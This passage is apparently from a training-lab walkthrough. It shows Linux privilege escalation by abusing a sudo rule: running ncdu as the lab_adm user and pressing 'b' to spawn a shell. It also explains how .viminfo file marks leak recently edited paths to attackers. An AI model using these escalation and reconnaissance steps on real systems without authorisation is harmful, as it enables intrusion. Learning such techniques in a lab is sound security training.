## 2. Privilege Escalation (User: lab_adm)

Checking sudo permissions for the current user `htb-student`:

```bash
htb-student@ubuntu:/home/lab_adm$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

### Exploit: ncdu Shell Escape
The user `htb-student` can run `/bin/ncdu` as any user except root. Since `lab_adm` is in the `sudo` group, gaining access to this account is a significant step.

1.  Run `ncdu` as `lab_adm`:
    ```bash
    sudo -u lab_adm ncdu
    ```
2.  Inside `ncdu`, press `b` to escape to a shell.

This results in a shell as `lab_adm`:

```bash
lab_adm@ubuntu:/home/lab_adm$ id
uid=1001(lab_adm) gid=1001(lab_adm) groups=1001(lab_adm),27(sudo)
```

## Additional Concepts

### sudo -u (user)
The `sudo -u` flag allows a user to run a command as another user. In this scenario, `htb-student` was permitted to run `ncdu` as anyone except `root`, so we chose `lab_adm`.

### ncdu Shell Escape
`ncdu` (NCurses Disk Usage) is an interactive analyzer. Many interactive CLI tools have shell escape characters (like `!` in `vim` or `b` in `ncdu`) that allow the user to execute shell commands or spawn a new shell with the same privileges as the running process.

### .viminfo
The `.viminfo` file stores various types of information about the vim session, including the command line history, search string history, input-line history, contents of non-empty registers, and file marks. File marks are particularly useful for attackers as they reveal paths to files that the user has recently accessed or edited.

**Format Breakdown:**
*   `'0`: The mark name (0-9 for numbered marks, a-z for file marks). `'0` is the most recent file.
*   `1`: The line number in the file where the cursor was positioned.
*   `23`: The column number where the cursor was positioned.
*   `/usr/lib/int-check.sh`: The full path to the file.
*   `|4,48,1,23,1684749250,"/usr/lib/int-check.sh"`: A bar-separated line providing more metadata, including a Unix timestamp (e.g., `1684749250`) which can be used to determine when the file was last accessed.
    *   **4 (Type):** Indicates a File Mark.
    *   **48 (Identifier):** The ASCII decimal value for the mark name (e.g., `48` is the ASCII code for `0`, meaning mark `'0`).
    *   **1 (Sub-type/Flag):** A versioning flag or attribute for the mark format.
